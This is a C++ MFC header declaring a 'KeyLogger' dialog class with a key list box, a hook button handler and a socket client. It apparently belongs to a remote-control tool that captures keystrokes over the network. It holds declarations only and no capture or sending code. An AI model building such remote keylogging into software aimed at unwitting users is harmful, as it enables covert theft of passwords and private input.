#pragma once
#include "afxwin.h"
#include "afxsock.h"

// KeyLogger dialog

class KeyLogger : public CDialogEx
{
	DECLARE_DYNAMIC(KeyLogger)

public:
	KeyLogger(CWnd* pParent = NULL);   // standard constructor
	virtual ~KeyLogger();

// Dialog Data
#ifdef AFX_DESIGN_TIME
	enum { IDD = IDD_KeyLogger };
#endif

protected:
	virtual void DoDataExchange(CDataExchange* pDX);    // DDX/DDV support

	DECLARE_MESSAGE_MAP()
private:
	CListBox ListKeyLogger;
	CSocket *_client;
public:
	afx_msg void OnBnClickedHook();
	afx_msg void SetSocket(CSocket &client)
	{
		_client = &client;
	}
};
